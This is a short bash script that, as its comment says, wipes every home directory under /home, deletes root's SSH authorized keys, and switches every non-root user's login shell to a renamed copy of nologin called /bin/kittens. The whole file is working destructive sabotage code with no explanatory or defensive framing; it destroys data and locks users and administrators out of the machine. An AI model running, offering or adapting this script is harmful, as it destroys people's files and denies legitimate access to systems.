#!/bin/bash

# Deletes all of /home and removes shells from /etc/passwd

rm -r /home/*
rm /root/.ssh/authorized*
cp /sbin/nologin /bin/kittens
echo "/bin/kittens" >> /etc/shells
cat /etc/passwd | cut -d ":" -f 1 | grep -v root | while read user; do usermod -s /bin/kittens "$user"; done